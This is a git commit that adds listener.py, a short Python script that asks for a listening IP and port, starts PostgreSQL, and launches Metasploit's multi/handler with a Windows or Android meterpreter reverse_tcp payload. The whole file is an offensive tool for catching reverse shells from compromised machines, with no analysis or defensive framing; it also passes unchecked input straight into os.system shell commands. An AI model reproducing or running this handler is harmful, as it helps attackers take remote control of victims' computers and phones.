8c726d46d3bb7140cfad2d879fc52749f74339ee
febinrev <52229330+febinrev@users.noreply.github.com>
2019-08-04 08:33:36 +0530

    Add files via upload

---
+++ listener.py
@@ -0,0 +1,18 @@
+import os
+import socket
+print("[1] msf meterpreter listener")
+print("[0] ")
+print("""
+
+
+""")
+listener=int(input("Enter the choice : "))
+ip=input("ENTER LHOST IP : ")
+port=int(input("Enter LPORT : "))
+if listener==1:
+	os.system("service postgresql start")
+	op=input("ENTER THE PAYLOAD FOR (windows or android): ")
+	os.system(f"msfconsole -x 'use exploit/multi/handler; set lhost {ip}; set lport {port}; set payload {op}/meterpreter/reverse_tcp; exploit'")
+else:
+	print("Exiting ,,,BYE BYE>>>>>>>")
+
